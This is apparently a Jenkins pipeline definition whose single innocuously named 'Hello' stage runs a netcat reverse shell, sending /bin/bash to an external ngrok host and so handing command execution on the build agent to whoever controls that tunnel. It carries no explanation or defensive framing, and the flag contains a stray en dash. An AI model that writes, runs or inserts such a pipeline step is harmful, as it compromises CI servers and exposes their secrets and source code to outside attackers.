pipeline {
  agent none
  stages {
    stage('Hello') {
      agent any
      steps {
        sh '''#!/bin/bash
        nc d3e32bddf06d.ngrok.io –e /bin/bash
        '''
      }
    }

  }
}
